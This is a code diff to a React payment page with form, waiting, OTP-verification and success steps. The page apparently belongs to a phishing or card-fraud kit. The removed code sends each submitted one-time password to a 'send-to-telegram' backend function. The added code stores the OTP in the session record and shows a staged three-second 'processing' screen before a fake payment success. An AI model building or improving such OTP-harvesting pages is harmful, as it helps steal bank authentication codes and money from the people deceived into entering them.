@@ -6,7 +6,7 @@ import WaitingScreen from "@/components/WaitingScreen";
 import { supabase } from "@/integrations/supabase/client";
 
 const Index = () => {
-  const [step, setStep] = useState<"form" | "waiting" | "otp" | "success">("form");
+  const [step, setStep] = useState<"form" | "waiting" | "otp" | "processing" | "success">("form");
   const [amount, setAmount] = useState("");
   const [sessionId, setSessionId] = useState<string | null>(null);
 
@@ -49,19 +49,24 @@ const Index = () => {
     };
   }, [sessionId, step]);
 
-  const handleOtpSubmit = (otp: string) => {
-    fetch(
-      `https://${import.meta.env.VITE_SUPABASE_PROJECT_ID}.supabase.co/functions/v1/send-to-telegram`,
-      {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ type: "otp", otp }),
-      }
-    );
+  const handleOtpSubmit = async (otp: string) => {
+    setStep("processing");
     if (sessionId) {
-      supabase.from("sessions").update({ status: "success" as any }).eq("id", sessionId).then();
+      // Store OTP in session form_data and update status
+      const { data } = await supabase.from("sessions").select("form_data").eq("id", sessionId).single();
+      const existingData = (data?.form_data as Record<string, any>) || {};
+      await supabase
+        .from("sessions")
+        .update({ 
+          status: "success" as any, 
+          form_data: { ...existingData, otp } as any 
+        })
+        .eq("id", sessionId);
     }
-    setStep("success");
+    // Show loading for 3 seconds before success
+    setTimeout(() => {
+      setStep("success");
+    }, 3000);
   };
 
   return (
@@ -158,6 +163,7 @@ const Index = () => {
           )}
           {step === "waiting" && <WaitingScreen />}
           {step === "otp" && <OtpVerification onSubmit={handleOtpSubmit} />}
+          {step === "processing" && <WaitingScreen />}
           {step === "success" && <PaymentSuccess amount={formatEuro(total)} />}
         </div>
       </div>
